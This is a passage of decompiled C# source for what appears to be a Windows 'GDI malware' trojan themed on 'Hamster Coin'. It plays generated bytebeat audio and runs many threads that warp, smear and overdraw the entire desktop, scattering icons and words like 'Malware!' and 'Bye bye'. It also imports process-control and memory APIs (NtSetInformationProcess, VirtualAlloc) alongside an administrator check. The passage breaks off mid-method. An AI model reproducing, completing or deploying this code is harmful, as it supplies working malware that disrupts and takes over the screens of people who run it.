        binaryWriter.Seek(4, SeekOrigin.Begin);
        binaryWriter.Write((uint) ((ulong) binaryWriter.BaseStream.Length - 8UL));
        output.Seek(0L, SeekOrigin.Begin);
        new SoundPlayer((Stream) output).PlaySync();
      }
    }

    private static void byte20(int hz, int secs)
    {
      Random random = new Random();
      using (MemoryStream output = new MemoryStream())
      {
        BinaryWriter binaryWriter = new BinaryWriter((Stream) output);
        binaryWriter.Write("RIFF".ToCharArray());
        binaryWriter.Write(0U);
        binaryWriter.Write("WAVE".ToCharArray());
        binaryWriter.Write("fmt ".ToCharArray());
        binaryWriter.Write(16U /*0x10*/);
        binaryWriter.Write((ushort) 1);
        int num1 = 1;
        int num2 = hz;
        int num3 = 8;
        binaryWriter.Write((ushort) num1);
        binaryWriter.Write((uint) num2);
        binaryWriter.Write((uint) (num2 * num1 * num3 / 8));
        binaryWriter.Write((ushort) (num1 * num3 / 8));
        binaryWriter.Write((ushort) num3);
        binaryWriter.Write("data".ToCharArray());
        int num4 = secs;
        byte[] numArray = new byte[num2 * num4];
        for (int index = 0; index < numArray.Length; ++index)
          numArray[index] = (byte) ((double) (index % (int) short.MaxValue >> 3) * Math.Sin((double) (index * (1 + (5 & index >> 10)) * (3 + (Convert.ToBoolean(index >> 17 & 1) ? (2 ^ 2 & index >> 14) / 3 : 3 & (index >> 13) + 1)) >> (3 & index >> 9))));
        binaryWriter.Write((uint) (numArray.Length * num1 * num3 / 8));
        foreach (byte num5 in numArray)
          binaryWriter.Write(num5);
        binaryWriter.Seek(4, SeekOrigin.Begin);
        binaryWriter.Write((uint) ((ulong) binaryWriter.BaseStream.Length - 8UL));
        output.Seek(0L, SeekOrigin.Begin);
        new SoundPlayer((Stream) output).PlaySync();
      }
    }

    [DllImport("user32.dll", CharSet = CharSet.Auto)]
    private static extern int FindWindow(string lpClassName, string lpWindowName);

    [DllImport("user32.dll", CharSet = CharSet.Auto)]
    private static extern bool ShowWindow(int hWnd, int cmdShow);

    public static bool IsAdministrator()
    {
      return new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator);
    }

    [STAThread]
    private static void Main()
    {
      Application.EnableVisualStyles();
      Application.SetCompatibleTextRenderingDefault(false);
      Program.er1.mainForm = new Form1();
      Thread.Sleep(10);
      Program.er1.Drawer drawer1 = (Program.er1.Drawer) new Program.er1.ReDrawer();
      Program.er1.Drawer drawer2 = (Program.er1.Drawer) new Program.er1.randomdrawer();
      Program.er1.randomdrawer1 randomdrawer1 = new Program.er1.randomdrawer1();
      Program.er1.msg msg = new Program.er1.msg();
      Program.er1.Drawer drawer3 = (Program.er1.Drawer) new Program.er1.bb();
      msg.Start();
      Thread.Sleep(500);
      drawer1.Start();
      drawer2.Start();
      randomdrawer1.Start();
      drawer3.Start();
      Application.Run((Form) Program.er1.mainForm);
    }

    [DllImport("gdi32.dll")]
    public static extern IntPtr SelectObject([In] IntPtr hdc, [In] IntPtr hgdiobj);

    [DllImport("gdi32.dll")]
    private static extern IntPtr CreateSolidBrush(uint crColor);

    [DllImport("gdi32.dll")]
    [return: MarshalAs(UnmanagedType.Bool)]
    public static extern bool DeleteObject([In] IntPtr hObject);

    [DllImport("user32.dll", SetLastError = true)]
    private static extern IntPtr GetDC(IntPtr hWnd);

    [DllImport("user32.dll")]
    private static extern bool ReleaseDC(IntPtr hWnd, IntPtr hDC);

    [DllImport("gdi32.dll", SetLastError = true)]
    [return: MarshalAs(UnmanagedType.Bool)]
    private static extern bool BitBlt(
      [In] IntPtr hdc,
      int nXDest,
      int nYDest,
      int nWidth,
      int nHeight,
      [In] IntPtr hdcSrc,
      int nXSrc,
      int nYSrc,
      int dwRop);

    [DllImport("gdi32.dll")]
    private static extern bool PatBlt(
      IntPtr hdc,
      int nXLeft,
      int nYLeft,
      int nWidth,
      int nHeight,
      CopyPixelOperation dwRop);

    [DllImport("user32.dll")]
    private static extern bool RedrawWindow(
      IntPtr hWnd,
      IntPtr lprcUpdate,
      IntPtr hrgnUpdate,
      Program.er1.RedrawWindowFlags flags);

    [DllImport("gdi32.dll", SetLastError = true)]
    public static extern IntPtr CreateCompatibleDC(IntPtr hdc);

    [DllImport("gdi32.dll")]
    public static extern IntPtr CreateCompatibleBitmap([In] IntPtr hdc, int nWidth, int nHeight);

    [DllImport("msimg32.dll")]
    [return: MarshalAs(UnmanagedType.Bool)]
    public static extern bool AlphaBlend(
      IntPtr hdcDest,
      int xoriginDest,
      int yoriginDest,
      int wDest,
      int hDest,
      IntPtr hdcSrc,
      int xoriginSrc,
      int yoriginSrc,
      int wSrc,
      int hSrc,
      Program.er1._BLENDFUNCTION ftn);

    [DllImport("gdi32.dll")]
    private static extern bool PlgBlt(
      IntPtr hdcDest,
      Program.er1.POINT[] lpPoint,
      IntPtr hdcSrc,
      int nXSrc,
      int nYSrc,
      int nWidth,
      int nHeight,
      IntPtr hbmMask,
      int xMask,
      int yMask);

    [DllImport("gdi32.dll")]
    private static extern bool StretchBlt(
      IntPtr hdcDest,
      int nXOriginDest,
      int nYOriginDest,
      int nWidthDest,
      int nHeightDest,
      IntPtr hdcSrc,
      int nXOriginSrc,
      int nYOriginSrc,
      int nWidthSrc,
      int nHeightSrc,
      Program.er1.TernaryRasterOperations dwRop);

    [DllImport("user32.dll")]
    public static extern IntPtr GetDesktopWindow();

    [DllImport("user32.dll")]
    public static extern IntPtr GetWindowDC(IntPtr hWnd);

    [DllImport("kernel32")]
    public static extern IntPtr VirtualAlloc(
      IntPtr lpAddress,
      uint dwSize,
      uint flAllocationType,
      uint flProtect);

    [DllImport("gdi32.dll")]
    public static extern IntPtr CreateEllipticRgn(
      int nLeftRect,
      int nTopRect,
      int nRightRect,
      int nBottomRect);

    [DllImport("ntdll.dll", SetLastError = true)]
    private static extern int NtSetInformationProcess(
      IntPtr hProcess,
      int processInformationClass,
      ref int processInformation,
      int processInformationLength);

    [DllImport("user32.dll")]
    private static extern int GetFocus();

    [DllImport("user32.dll")]
    private static extern bool AttachThreadInput(uint idAttach, uint idAttachTo, bool fAttach);

    [DllImport("kernel32.dll")]
    private static extern uint GetCurrentThreadId();

    [DllImport("user32.dll")]
    private static extern uint GetWindowThreadProcessId(int hWnd, int ProcessId);

    [DllImport("user32.dll", CharSet = CharSet.Auto)]
    private static extern int SendMessage(int hWnd, int Msg, int wParam, StringBuilder lParam);

    private class ReDrawer : Program.er1.Drawer
    {
      private int redrawCounter;

      public override void Draw(IntPtr hdc)
      {
        for (int index = 0; index < 3; ++index)
          this.Redraw();
        Thread.Sleep(this.random.Next(7500));
      }
    }

    public class Driwer
    {
      public void OpenForm2(Form parentForm)
      {
        Form form1 = (Form) new Form1();
        form1.StartPosition = FormStartPosition.Manual;
        Form form2 = form1;
        Point location = parentForm.Location;
        int x = location.X;
        location = parentForm.Location;
        int y = location.Y - form1.Height - 10;
        Point point = new Point(x, y);
        form2.Location = point;
        form1.Show();
      }
    }

    private class Drawer1 : Program.er1.Drawer
    {
      private int redrawCounter;

      public override void Draw(IntPtr hdc)
      {
        try
        {
          Graphics g = Graphics.FromHdc(hdc);
          foreach (PropertyInfo property in typeof (Cursors).GetProperties(BindingFlags.Static | BindingFlags.Public))
          {
            Point location = new Point(this.random.Next(this.screenW), this.random.Next(this.screenH));
            Cursor cursor = (Cursor) property.GetValue((object) null, (object[]) null);
            cursor.Draw(g, new Rectangle(location, cursor.Size));
            Thread.Sleep(this.random.Next(2));
          }
          g.Dispose();
        }
        catch
        {
        }
      }
    }

    private class Drawer2 : Program.er1.Drawer
    {
      private int redrawCounter;
      private Icon app = Program.er1.Extract("user32.dll", 5, true);
      private Icon warn_ico = Program.er1.Extract("user32.dll", 1, true);
      private Icon no_ico = Program.er1.Extract("user32.dll", 3, true);

      public override void Draw(IntPtr hdc)
      {
        try
        {
          Graphics graphics = Graphics.FromHdc(hdc);
          Bitmap bitmap1 = this.app.ToBitmap();
          Bitmap bitmap2 = this.warn_ico.ToBitmap();
          Bitmap bitmap3 = this.no_ico.ToBitmap();
          graphics.DrawImage((Image) bitmap1, this.random.Next(this.screenW), this.random.Next(this.screenH), this.random.Next(200), this.random.Next(200));
          graphics.DrawImage((Image) bitmap2, this.random.Next(this.screenW), this.random.Next(this.screenH), this.random.Next(200), this.random.Next(200));
          graphics.DrawImage((Image) bitmap3, this.random.Next(this.screenW), this.random.Next(this.screenH), this.random.Next(200), this.random.Next(200));
        }
        catch
        {
        }
        Thread.Sleep(this.random.Next(1));
      }
    }

    private class Drawer3 : Program.er1.Drawer
    {
      private int redrawCounter;
      private new Random random = new Random();
      private string[] words = new string[10]
      {
        "Hamster",
        "Criminal",
        "Coin",
        "HC!",
        "hehehe",
        "corrupt",
        "Malware!",
        "10B Coins!",
        "HAMSTER COIN",
        "Bye bye"
      };

      public override void Draw(IntPtr hdc)
      {
        try
        {
          IntPtr compatibleDc = Program.er1.CreateCompatibleDC(hdc);
          IntPtr compatibleBitmap = Program.er1.CreateCompatibleBitmap(hdc, this.screenW, this.screenH);
          Program.er1.SelectObject(compatibleDc, compatibleBitmap);
          Program.er1.BitBlt(compatibleDc, 0, 0, this.screenW, this.screenH, hdc, 0, 0, 13369376);
          Graphics graphics = Graphics.FromHdc(compatibleDc);
          graphics.RotateTransform((float) this.random.Next(360));
          string word = this.words[this.random.Next(this.words.Length)];
          Brush brush = (Brush) new SolidBrush(Color.FromArgb(this.random.Next((int) byte.MaxValue), this.random.Next((int) byte.MaxValue), this.random.Next((int) byte.MaxValue)));
          graphics.DrawString(word, new Font(FontFamily.GenericSansSerif, (float) this.random.Next(10, 100)), brush, (float) this.random.Next(this.screenW), (float) this.random.Next(this.screenH));
          Program.er1.BitBlt(hdc, 0, 0, this.screenW, this.screenH, compatibleDc, this.random.Next(-1, 2), this.random.Next(-1, 2), 13369376);
          Program.er1.DeleteObject(compatibleDc);
          Program.er1.DeleteObject(compatibleBitmap);
        }
        catch
        {
        }
        Thread.Sleep(this.random.Next(2));
      }
    }

    public struct RGB(byte r, byte g, byte b)
    {
      private byte _r = r;
      private byte _g = g;
      private byte _b = b;

      public byte R
      {
        get => this._r;
        set => this._r = value;
      }

      public byte G
      {
        get => this._g;
        set => this._g = value;
      }

      public byte B
      {
        get => this._b;
        set => this._b = value;
      }

      public bool Equals(Program.er1.RGB rgb)
      {
        return (int) this.R == (int) rgb.R && (int) this.G == (int) rgb.G && (int) this.B == (int) rgb.B;
      }
    }

    public struct HSL(int h, float s, float l)
    {
      private int _h = h;
      private float _s = s;
      private float _l = l;

      public int H
      {
        get => this._h;
        set => this._h = value;
      }

      public float S
      {
        get => this._s;
        set => this._s = value;
      }

      public float L
      {
        get => this._l;
        set => this._l = value;
      }

      public bool Equals(Program.er1.HSL hsl)
      {
        return this.H == hsl.H && (double) this.S == (double) hsl.S && (double) this.L == (double) hsl.L;
      }
    }

    private class Drawer4 : Program.er1.Drawer
    {
      private int redrawCounter;
      private static Random r = new Random();
      private int cc;
      private static int ballWidth = 200;
      private static int ballHeight = 200;
      private static int ballPosX = Program.er1.Drawer4.r.Next(Screen.PrimaryScreen.Bounds.Width - 200);
      private static int ballPosY = Program.er1.Drawer4.r.Next(Screen.PrimaryScreen.Bounds.Height - 200);
      private static int moveStepX = 10;
      private static int moveStepY = 10;

      public override void Draw(IntPtr hdc)
      {
        try
        {
          IntPtr compatibleDc = Program.er1.CreateCompatibleDC(hdc);
          IntPtr compatibleBitmap = Program.er1.CreateCompatibleBitmap(hdc, this.screenW, this.screenH);
          Program.er1.SelectObject(compatibleDc, compatibleBitmap);
          Program.er1.BitBlt(compatibleDc, 0, 0, this.screenW, this.screenH, hdc, 0, 0, 13369376);
          Graphics graphics = Graphics.FromHdc(compatibleDc);
          double num1 = (double) (Screen.PrimaryScreen.Bounds.Width / 10);
          int num2 = Screen.PrimaryScreen.Bounds.Height / 10;
          float num3 = 0.0f;
          float num4 = 0.0f;
          float num5 = 10f;
          for (float a = 0.0f; (double) a < num1; a += 0.1f)
          {
            double num6 = Math.Sin((double) a);
            ++this.redrawCounter;
            int redrawCounter = this.redrawCounter;
            int nYDest = (int) ((double) num3 * (double) num5 + (double) num4);
            Program.er1.BitBlt(compatibleDc, redrawCounter, nYDest, 1, this.screenH, compatibleDc, redrawCounter, 0, 13369376);
            Program.er1.BitBlt(compatibleDc, redrawCounter, this.screenH + nYDest, 1, this.screenH, compatibleDc, redrawCounter, 0, 13369376);
            Program.er1.BitBlt(compatibleDc, redrawCounter, -this.screenH + nYDest, 1, this.screenH, compatibleDc, redrawCounter, 0, 13369376);
            if (this.redrawCounter >= this.screenW)
              this.redrawCounter = 0;
            num3 = (float) num6;
          }
          Program.er1.Drawer4.ballPosX += Program.er1.Drawer4.moveStepX;
          if (Program.er1.Drawer4.ballPosX < 0 || Program.er1.Drawer4.ballPosX + Program.er1.Drawer4.ballWidth > this.screenW)
            Program.er1.Drawer4.moveStepX = -Program.er1.Drawer4.moveStepX;
          Program.er1.Drawer4.ballPosY += Program.er1.Drawer4.moveStepY;
          if (Program.er1.Drawer4.ballPosY < 0 || Program.er1.Drawer4.ballPosY + Program.er1.Drawer4.ballHeight > this.screenH)
            Program.er1.Drawer4.moveStepY = -Program.er1.Drawer4.moveStepY;
          this.cc += 10;
          Program.er1.RGB rgb = Program.er1.HSLToRGB(new Program.er1.HSL(this.cc % 360, 1f, 0.5f));
          Brush brush = (Brush) new SolidBrush(Color.FromArgb((int) rgb.R, (int) rgb.G, (int) rgb.B));
          Pen pen = new Pen(Color.Red);
          graphics.FillEllipse(brush, Program.er1.Drawer4.ballPosX, Program.er1.Drawer4.ballPosY, Program.er1.Drawer4.ballWidth, Program.er1.Drawer4.ballHeight);
          for (int index = 0; index < 100; index += 10)
            graphics.DrawEllipse(pen, Program.er1.Drawer4.ballPosX - index / 2, Program.er1.Drawer4.ballPosY - index / 2, Program.er1.Drawer4.ballWidth + index, Program.er1.Drawer4.ballHeight + index);
          Program.er1.BitBlt(hdc, 0, 0, this.screenW, this.screenH, compatibleDc, 0, 0, 13369376);
          Program.er1.DeleteObject(compatibleDc);
          Program.er1.DeleteObject(compatibleBitmap);
          Thread.Sleep(this.random.Next(10));
        }
        catch
        {
        }
      }
    }

    private class Drawer5 : Program.er1.Drawer
    {
      private int redrawCounter;
      private int ads;

      public override void Draw(IntPtr hdc)
      {
        try
        {
          IntPtr compatibleDc = Program.er1.CreateCompatibleDC(hdc);
          IntPtr compatibleBitmap = Program.er1.CreateCompatibleBitmap(hdc, this.screenW, this.screenH);
          Program.er1.SelectObject(compatibleDc, compatibleBitmap);
          Program.er1.BitBlt(compatibleDc, 0, 0, this.screenW, this.screenH, hdc, 0, 0, 13369376);
          Program.er1.BitBlt(compatibleDc, 0, 0, this.screenW, this.screenH, compatibleDc, 20, 30, 13369376);
          Program.er1.BitBlt(compatibleDc, 0, 0, this.screenW, this.screenH, compatibleDc, -this.screenW + 20, 30, 13369376);
          Program.er1.BitBlt(compatibleDc, 0, 0, this.screenW, this.screenH, compatibleDc, 20, -this.screenH + 30, 13369376);
          Program.er1.BitBlt(compatibleDc, 0, 0, this.screenW, this.screenH, compatibleDc, -this.screenW + 20, -this.screenH + 30, 13369376);
          ++this.ads;
          if (this.ads >= this.random.Next(12))
          {
            Program.er1.SelectObject(compatibleDc, compatibleBitmap);
            Program.er1.BitBlt(compatibleDc, 0, 0, this.screenW, this.screenH, hdc, 0, 0, 13369376);
            for (int index = 0; index < this.screenH; index += 2)
            {
              Program.er1.BitBlt(compatibleDc, -50, index, this.screenW, 1, compatibleDc, 0, index, 13369376);
              Program.er1.BitBlt(compatibleDc, this.screenW - 50, index, this.screenW, 1, compatibleDc, 0, index, 13369376);
              Program.er1.BitBlt(compatibleDc, 50, index - 1, this.screenW, 1, compatibleDc, 0, index - 1, 13369376);
              Program.er1.BitBlt(compatibleDc, -this.screenW + 50, index - 1, this.screenW, 1, compatibleDc, 0, index - 1, 13369376);
            }
            this.ads = 0;
          }
          Program.er1.BitBlt(hdc, 0, 0, this.screenW, this.screenH, compatibleDc, 0, 0, 13369376);
          Program.er1.DeleteObject(compatibleDc);
          Program.er1.DeleteObject(compatibleBitmap);
          Thread.Sleep(this.random.Next(10));
        }
        catch
        {
        }
      }
    }

    private class Drawer6 : Program.er1.Drawer
    {
      private int redrawCounter;
      private int redrawCounter2;

      public override void Draw(IntPtr hdc)
      {
        try
        {
          IntPtr compatibleDc = Program.er1.CreateCompatibleDC(hdc);
          IntPtr compatibleBitmap = Program.er1.CreateCompatibleBitmap(hdc, this.screenW, this.screenH);
          Program.er1.SelectObject(compatibleDc, compatibleBitmap);
          Program.er1.BitBlt(compatibleDc, 0, 0, this.screenW, this.screenH, hdc, 0, 0, 13369376);
          double num1 = (double) (Screen.PrimaryScreen.Bounds.Width / 1);
          int num2 = Screen.PrimaryScreen.Bounds.Height / 1;
          float num3 = 0.0f;
          float num4 = 10f;
          float num5 = 10f;
          for (float a = 0.0f; (double) a < num1; ++a)
          {
            double num6 = Math.Sin((double) a);
            ++this.redrawCounter;
            int redrawCounter = this.redrawCounter;
            int nYDest = (int) ((double) num3 * (double) num5 + (double) num4);
            Program.er1.BitBlt(compatibleDc, redrawCounter, nYDest, 1, this.screenH, compatibleDc, redrawCounter, 0, 13369376);
            Program.er1.BitBlt(compatibleDc, redrawCounter, this.screenH + nYDest, 1, this.screenH, compatibleDc, redrawCounter, 0, 13369376);
            Program.er1.BitBlt(compatibleDc, redrawCounter, -this.screenH + nYDest, 1, this.screenH, compatibleDc, redrawCounter, 0, 13369376);
            if (this.redrawCounter >= this.screenW)
              this.redrawCounter = 0;
            num3 = (float) num6;
          }
          Program.er1.BitBlt(hdc, 0, 0, this.screenW, this.screenH, compatibleDc, 0, 0, 13369376);
          Program.er1.DeleteObject(compatibleDc);
          Program.er1.DeleteObject(compatibleBitmap);
          Thread.Sleep(this.random.Next(10));
        }
        catch
        {
        }
      }
    }

    private class Drawer7 : Program.er1.Drawer
    {
      private int redrawCounter;
      private int cc;

      public override void Draw(IntPtr hdc)
      {
        try
        {
          IntPtr compatibleDc = Program.er1.CreateCompatibleDC(hdc);
          IntPtr compatibleBitmap = Program.er1.CreateCompatibleBitmap(hdc, this.screenW, this.screenH);
          Program.er1.SelectObject(compatibleDc, compatibleBitmap);
          Program.er1.BitBlt(compatibleDc, 0, 0, this.screenW, this.screenH, hdc, 0, 0, 13369376);
          Graphics graphics = Graphics.FromHdc(compatibleDc);
          Program.er1.SelectObject(compatibleDc, compatibleBitmap);
          Program.er1.BitBlt(compatibleDc, 0, 0, this.screenW, this.screenH, hdc, 0, 0, 13369376);
          for (int index = 0; index < this.screenH; index += 2)
          {
            Program.er1.BitBlt(compatibleDc, -50, index, this.screenW, 1, compatibleDc, 0, index, 13369376);
            Program.er1.BitBlt(compatibleDc, this.screenW - 50, index, this.screenW, 1, compatibleDc, 0, index, 13369376);
            Program.er1.BitBlt(compatibleDc, -25, index - 1, this.screenW, 1, compatibleDc, 0, index - 1, 13369376);
            Program.er1.BitBlt(compatibleDc, this.screenW - 25, index - 1, this.screenW, 1, compatibleDc, 0, index - 1, 13369376);
          }
          for (int index = 0; index < this.screenH; index += 2)
          {
            ++this.cc;
            Program.er1.RGB rgb = Program.er1.HSLToRGB(new Program.er1.HSL(this.cc % 360, 1f, 0.5f));
            Pen pen = new Pen(Color.FromArgb(69, (int) rgb.R, (int) rgb.G, (int) rgb.B), 2f);
            graphics.DrawLine(pen, 0, index, this.screenW, index);
          }
          Program.er1.AlphaBlend(hdc, 0, 0, this.screenW, this.screenH, compatibleDc, 0, 0, this.screenW, this.screenH, new Program.er1._BLENDFUNCTION()
          {
            BlendOp = (byte) 0,
            BlendFlags = (byte) 0,
            SourceConstantAlpha = (byte) 64 /*0x40*/,
            AlphaFormat = (byte) 0
          });
          Program.er1.DeleteObject(compatibleDc);
          Program.er1.DeleteObject(compatibleBitmap);
          Thread.Sleep(this.random.Next(10));
        }
        catch
        {
        }
      }
    }

    private class Drawer8 : Program.er1.Drawer
    {
      private int redrawCounter;

      public override void Draw(IntPtr hdc)
      {
        try
        {
          IntPtr compatibleDc = Program.er1.CreateCompatibleDC(hdc);
          IntPtr compatibleBitmap = Program.er1.CreateCompatibleBitmap(hdc, this.screenW, this.screenH);
          Program.er1.SelectObject(compatibleDc, compatibleBitmap);
          Program.er1.BitBlt(compatibleDc, 0, 0, this.screenW, this.screenH, hdc, 0, 0, 13369376);
          Graphics.FromHdc(compatibleDc);
          Program.er1.POINT[] lpPoint = new Program.er1.POINT[3];
          int left = Screen.PrimaryScreen.Bounds.Left;
          int top = Screen.PrimaryScreen.Bounds.Top;
          int right = Screen.PrimaryScreen.Bounds.Right;
          int bottom = Screen.PrimaryScreen.Bounds.Bottom;
          int num1 = this.random.Next(1, 26);
          int num2 = this.random.Next(-5, 6);
          int num3 = this.random.Next(-5, 6);
          int num4 = this.random.Next(-5, 6);
          int num5 = this.random.Next(-5, 6);
          int num6 = this.random.Next(-5, 6);
          int num7 = this.random.Next(-5, 6);
          for (int index = 0; index < num1; ++index)
          {
            lpPoint[0].X = left - num2;
            lpPoint[0].Y = top + num3;
            lpPoint[1].X = right - num4;
            lpPoint[1].Y = top + num5;
            lpPoint[2].X = left + num6;
            lpPoint[2].Y = bottom - num7;
            Program.er1.PlgBlt(compatibleDc, lpPoint, compatibleDc, left, top, right - left, bottom - top, IntPtr.Zero, 0, 0);
            Program.er1.BitBlt(hdc, 0, 0, this.screenW, this.screenH, compatibleDc, 0, 0, 6684742);
          }
          Program.er1.DeleteObject(compatibleDc);
          Program.er1.DeleteObject(compatibleBitmap);
          Thread.Sleep(this.random.Next(10));
        }
        catch
        {
        }
      }
    }

    private class Drawer10 : Program.er1.Drawer
    {
      private int redrawCounter2;

      public override void Draw(IntPtr hdc)
      {
        try
        {
          IntPtr compatibleDc = Program.er1.CreateCompatibleDC(hdc);
          IntPtr compatibleBitmap = Program.er1.CreateCompatibleBitmap(hdc, this.screenW, this.screenH);
          Program.er1.SelectObject(compatibleDc, compatibleBitmap);
          Program.er1.BitBlt(compatibleDc, 0, 0, this.screenW, this.screenH, hdc, 0, 0, 13369376);
          float num1 = 0.0f;
          float num2 = 0.0f;
          float num3 = 5f;
          for (float a = 0.0f; (double) a < (double) (Screen.PrimaryScreen.Bounds.Height / 10); a += 0.1f)
          {
            double num4 = Math.Sin((double) a);
            ++this.redrawCounter2;
            int redrawCounter2 = this.redrawCounter2;
            int nXDest = (int) ((double) num1 * (double) num3 + (double) num2);
            Program.er1.BitBlt(compatibleDc, nXDest, redrawCounter2, this.screenW, 1, compatibleDc, 0, redrawCounter2, 13369376);
            Program.er1.BitBlt(compatibleDc, this.screenW + nXDest, redrawCounter2, this.screenW, 1, compatibleDc, 0, redrawCounter2, 13369376);
            Program.er1.BitBlt(compatibleDc, -this.screenW + nXDest, redrawCounter2, this.screenW, 1, compatibleDc, 0, redrawCounter2, 13369376);
            if (this.redrawCounter2 >= this.screenH)
              this.redrawCounter2 = 0;
            num1 = (float) num4;
          }
          Program.er1.BitBlt(hdc, 0, 0, this.screenW, this.screenH, compatibleDc, 0, 0, 13369376);
          Program.er1.ReleaseDC(compatibleDc, compatibleBitmap);
          Program.er1.DeleteObject(compatibleDc);
          Program.er1.DeleteObject(compatibleBitmap);
          Thread.Sleep(this.random.Next(10));
        }
        catch
        {
        }
      }
    }

    private class Drawer11 : Program.er1.Drawer
    {
      private int redrawCounter;
      private int redrawCounter2;

      public override void Draw(IntPtr hdc)
      {
        try
        {
          IntPtr compatibleDc = Program.er1.CreateCompatibleDC(hdc);
          IntPtr compatibleBitmap = Program.er1.CreateCompatibleBitmap(hdc, this.screenW, this.screenH);
          Program.er1.SelectObject(compatibleDc, compatibleBitmap);
          Program.er1.BitBlt(compatibleDc, 0, 0, this.screenW, this.screenH, hdc, 0, 0, 13369376);
          double num1 = (double) (Screen.PrimaryScreen.Bounds.Width / 1000);
          double num2 = (double) (Screen.PrimaryScreen.Bounds.Height / 1000);
          float num3 = 0.0f;
          float num4 = 0.0f;
          float num5 = 50f;
          for (float a = 0.0f; (double) a < num1; a += 1f / 1000f)
          {
            double num6 = Math.Sin((double) a);
            ++this.redrawCounter;
            int redrawCounter = this.redrawCounter;
            int nYDest = (int) Math.Round((double) num3 * (double) num5 + (double) num4);
            Program.er1.BitBlt(compatibleDc, redrawCounter, nYDest, 1, this.screenH, compatibleDc, redrawCounter, 0, 13369376);
            Program.er1.BitBlt(compatibleDc, redrawCounter, this.screenH + nYDest, 1, this.screenH, compatibleDc, redrawCounter, 0, 13369376);
            Program.er1.BitBlt(compatibleDc, redrawCounter, -this.screenH + nYDest, 1, this.screenH, compatibleDc, redrawCounter, 0, 13369376);
            if (this.redrawCounter >= this.screenW)
              this.redrawCounter = 0;
            num3 = (float) num6;
          }
          for (float a = 0.0f; (double) a < num2; a += 1f / 1000f)
          {
            double num7 = Math.Sin((double) a);
            ++this.redrawCounter2;
            int redrawCounter2 = this.redrawCounter2;
            int nXDest = (int) Math.Round((double) num3 * (double) num5 + (double) num4);
            Program.er1.BitBlt(compatibleDc, nXDest, redrawCounter2, this.screenW, 1, compatibleDc, 0, redrawCounter2, 13369376);
            Program.er1.BitBlt(compatibleDc, this.screenW + nXDest, redrawCounter2, this.screenW, 1, compatibleDc, 0, redrawCounter2, 13369376);
            Program.er1.BitBlt(compatibleDc, -this.screenW + nXDest, redrawCounter2, this.screenW, 1, compatibleDc, 0, redrawCounter2, 13369376);
            if (this.redrawCounter2 >= this.screenH)
              this.redrawCounter2 = 0;
            num3 = (float) num7;
          }
          Program.er1.BitBlt(hdc, 0, 0, this.screenW, this.screenH, compatibleDc, 0, 0, 13369376);
          Program.er1.DeleteObject(compatibleDc);
          Program.er1.DeleteObject(compatibleBitmap);
          Thread.Sleep(this.random.Next(10));
        }
        catch
        {
        }
      }
    }

    private class Drawer12 : Program.er1.Drawer
    {
      private int redrawCounter;
      private int redrawCounter2;
      private static Random r = new Random();
      private int cc;
      private static int ballWidth = 500;
      private static int ballHeight = 500;
      private static int ballPosX = Program.er1.Drawer12.r.Next(Screen.PrimaryScreen.Bounds.Width - 600);
      private static int ballPosY = Program.er1.Drawer12.r.Next(Screen.PrimaryScreen.Bounds.Height - 600);
      private static int moveStepX = 50;
      private static int moveStepY = 50;

      public override void Draw(IntPtr hdc)
      {
        try
        {
          IntPtr compatibleDc = Program.er1.CreateCompatibleDC(hdc);
          IntPtr compatibleBitmap = Program.er1.CreateCompatibleBitmap(hdc, this.screenW, this.screenH);
          Program.er1.SelectObject(compatibleDc, compatibleBitmap);
          Program.er1.BitBlt(compatibleDc, 0, 0, this.screenW, this.screenH, hdc, 0, 0, 13369376);
          Graphics graphics = Graphics.FromHdc(compatibleDc);
          double num1 = (double) (Screen.PrimaryScreen.Bounds.Width / 1000);
          double num2 = (double) (Screen.PrimaryScreen.Bounds.Height / 1000);
          float num3 = 0.0f;
          float num4 = 0.0f;
          float num5 = 50f;
          for (float a = 0.0f; (double) a < num1; a += 1f / 1000f)
          {
            double num6 = Math.Sin((double) a);
            ++this.redrawCounter;
            int redrawCounter = this.redrawCounter;
            int nYDest = (int) Math.Round((double) num3 * (double) num5 + (double) num4);
            Program.er1.BitBlt(compatibleDc, redrawCounter, nYDest, 1, this.screenH, compatibleDc, redrawCounter, 0, 13369376);
            Program.er1.BitBlt(compatibleDc, redrawCounter, this.screenH + nYDest, 1, this.screenH, compatibleDc, redrawCounter, 0, 13369376);
            Program.er1.BitBlt(compatibleDc, redrawCounter, -this.screenH + nYDest, 1, this.screenH, compatibleDc, redrawCounter, 0, 13369376);
            if (this.redrawCounter >= this.screenW)
              this.redrawCounter = 0;
            num3 = (float) num6;
          }
          for (float a = 0.0f; (double) a < num2; a += 1f / 1000f)
          {
            double num7 = Math.Sin((double) a);
            ++this.redrawCounter2;
            int redrawCounter2 = this.redrawCounter2;
            int nXDest = (int) Math.Round((double) num3 * (double) num5 + (double) num4);
            Program.er1.BitBlt(compatibleDc, nXDest, redrawCounter2, this.screenW, 1, compatibleDc, 0, redrawCounter2, 13369376);
            Program.er1.BitBlt(compatibleDc, this.screenW + nXDest, redrawCounter2, this.screenW, 1, compatibleDc, 0, redrawCounter2, 13369376);
            Program.er1.BitBlt(compatibleDc, -this.screenW + nXDest, redrawCounter2, this.screenW, 1, compatibleDc, 0, redrawCounter2, 13369376);
            if (this.redrawCounter2 >= this.screenH)
              this.redrawCounter2 = 0;
            num3 = (float) num7;
          }
          Program.er1.Drawer12.ballPosX += Program.er1.Drawer12.moveStepX;
          if (Program.er1.Drawer12.ballPosX < 0 || Program.er1.Drawer12.ballPosX + Program.er1.Drawer12.ballWidth > this.screenW)
            Program.er1.Drawer12.moveStepX = -Program.er1.Drawer12.moveStepX;
          Program.er1.Drawer12.ballPosY += Program.er1.Drawer12.moveStepY;
          if (Program.er1.Drawer12.ballPosY < 0 || Program.er1.Drawer12.ballPosY + Program.er1.Drawer12.ballHeight > this.screenH)
            Program.er1.Drawer12.moveStepY = -Program.er1.Drawer12.moveStepY;
          this.cc += 10;
          Program.er1.RGB rgb = Program.er1.HSLToRGB(new Program.er1.HSL(this.cc % 360, 1f, 0.5f));
          Brush brush = (Brush) new SolidBrush(Color.FromArgb((int) rgb.R, (int) rgb.G, (int) rgb.B));
          Pen pen = new Pen(Color.Red);
          graphics.FillEllipse(brush, Program.er1.Drawer12.ballPosX, Program.er1.Drawer12.ballPosY, Program.er1.Drawer12.ballWidth, Program.er1.Drawer12.ballHeight);
          Program.er1.BitBlt(hdc, 0, 0, this.screenW, this.screenH, compatibleDc, 0, 0, 6684742);
          Program.er1.DeleteObject(compatibleDc);
          Program.er1.DeleteObject(compatibleBitmap);
